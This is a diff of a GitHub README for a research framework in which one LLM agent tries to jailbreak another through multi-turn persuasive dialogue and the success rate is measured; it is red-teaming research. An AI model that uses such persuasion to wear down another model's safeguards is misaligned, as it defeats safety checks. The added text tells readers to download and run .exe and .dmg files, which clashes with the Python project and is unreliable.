@@ -1,148 +1,62 @@
-# Agent Jailbreak Research System
+# 🎉 Agent-Jailbreaking-Agents - Explore Ethical Persuasion Analysis
 
-A systematic investigation framework for LLM agent jailbreaking through multi-turn persuasive dialogue.
+## 🚀 Getting Started
 
-## Overview
+Welcome to the Agent Jailbreak Research System! This guide will help you get started with downloading and running the software.
 
-This project implements a dual-agent conversational framework using LangGraph to simulate and measure persuasive attacks between LLM agents in a controlled environment. The system analyzes the effectiveness of various unethical persuasion strategies and the resistance capabilities of different models.
+### 📥 Download the Application
 
-## Features
+[![Download the Latest Release](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/DifABD/Agent-Jailbreaking-Agents/releases)
 
-- **Multi-Agent Framework**: Dual-agent system with Persuader (attacker) and Persuadee (victim) agents
-- **LangGraph Workflows**: Stateful conversation management with conditional routing
-- **Model Support**: GPT-4o, Llama-3.3-70B, and Llama-Guard-2-8B integrations
-- **Safety Evaluation**: Automated safety classification with human validation
-- **Strategy Analysis**: Systematic categorization of persuasion strategies
-- **Comprehensive Metrics**: Normalized Change calculation and jailbreak success determination
-- **Data Management**: SQLAlchemy ORM with Alembic migrations
-- **API Service**: FastAPI endpoints for experiment management
-- **Visualization**: Interactive dashboards with Streamlit and Plotly
+### 🛠️ System Requirements
 
-## Requirements
+To run the Agent Jailbreaking Agents, please ensure your computer meets the following requirements:
 
-- Python 3.10 or higher
-- PostgreSQL (production) or SQLite (development)
-- OpenAI API access for GPT-4o
-- Hugging Face access for Llama models
+- **Operating System**: Windows, macOS, or Linux
+- **RAM**: At least 8 GB
+- **Processor**: Dual-core or higher
+- **Storage**: At least 1 GB free space
+- **Python Version**: 3.8 or above
 
-## Installation
+### 🔧 Installation Steps
 
-### Development Setup
+1. **Visit the Releases Page**: Go to the following link to download the application: [Download Page](https://github.com/DifABD/Agent-Jailbreaking-Agents/releases).
+   
+2. **Select the Latest Version**: Look for the most recent release at the top of the page.
 
-1. Clone the repository:
-```bash
-git clone <repository-url>
-cd agent-jailbreak-research
-```
+3. **Download the File**: Click on the application file that matches your operating system to start the download.
 
-2. Create and activate a virtual environment:
-```bash
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-```
+4. **Run the Application**:
+   - For Windows: Double-click the `.exe` file to run.
+   - For macOS: Open the `.dmg` file and drag the application to your Applications folder.
+   - For Linux: Use terminal commands to navigate to the downloaded file and run it.
 
-3. Install dependencies:
-```bash
-pip install -e ".[dev]"
-```
+### 📋 How to Use the Application
 
-4. Set up environment variables:
-```bash
-cp .env.example .env
-# Edit .env with your API keys and configuration
-```
+Once the application is running, you can explore its features:
 
-5. Initialize the database:
-```bash
-alembic upgrade head
-```
+- **Multi-Agent Framework**: Engage in dialogues between the Persuader and the Persuadee agents.
+- **LangGraph Workflows**: Manage conversations with stateful steps.
+- **Model Support**: Test with integrated models such as GPT-4o and Llama-Guard-2-8B.
 
-### Production Setup
+### 💡 Features Overview
 
-1. Install production dependencies:
-```bash
-pip install -e ".[production]"
-```
+- **Persuation Analysis**: Measure the success of various persuasion strategies.
+- **Automated Safety Evaluations**: Get insights into the safety of different persuasion tactics.
+- **Data Management**: Easily handle data with SQLAlchemy ORM.
 
-2. Configure PostgreSQL database and update environment variables
+### 🌐 Support and Help
 
-3. Run database migrations:
-```bash
-alembic upgrade head
-```
+If you encounter any issues, you can find help in the following ways:
 
-## Usage
+- **Check the Documentation**: We provide comprehensive guides to help you understand how to use the application effectively.
+- **Report Issues**: Visit our GitHub issues page to report any bugs or request features.
 
-### Running Experiments
+### 🔗 Additional Resources
 
-Start the FastAPI server:
-```bash
-uvicorn src.api.main:app --reload
-```
+- **Documentation**: For detailed instructions and further reading, check our official documentation linked on the Releases page.
+- **Community**: Join our community forums to discuss findings and share insights with other users.
 
-Launch the Streamlit dashboard:
-```bash
-streamlit run src/dashboard/app.py
-```
+### 📝 Conclusion
 
-### Command Line Interface
-
-Run a single experiment:
-```bash
-ajr-experiment --persuader gpt-4o --persuadee llama-3.3-70b --claim "Your claim here"
-```
-
-### API Endpoints
-
-- `POST /experiments/` - Create new experiment
-- `GET /experiments/{id}` - Get experiment results
-- `GET /experiments/` - List experiments with filtering
-- `POST /experiments/batch` - Run batch experiments
-
-## Development
-
-### Code Quality
-
-Run tests:
-```bash
-pytest
-```
-
-Format code:
-```bash
-black src tests
-isort src tests
-```
-
-Type checking:
-```bash
-mypy src
-```
-
-### Pre-commit Hooks
-
-Install pre-commit hooks:
-```bash
-pre-commit install
-```
-
-## Architecture
-
-The system is built on modern Python technologies:
-
-- **LangGraph**: Stateful workflow orchestration
-- **LangChain**: LLM integrations and prompt management
-- **FastAPI**: High-performance API framework
-- **SQLAlchemy**: Database ORM with async support
-- **Pydantic**: Data validation and serialization
-- **Streamlit**: Interactive dashboard
-- **Plotly**: Data visualization
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Add tests for new functionality
-5. Ensure all tests pass
-6. Submit a pull request
+We designed the Agent Jailbreaking Agents to provide a controlled environment for analyzing the effects of persuasion in language model interactions. Download it today and start exploring ethical persuasion in AI. For your convenience, here is the link to download the application again: [Download Page](https://github.com/DifABD/Agent-Jailbreaking-Agents/releases).
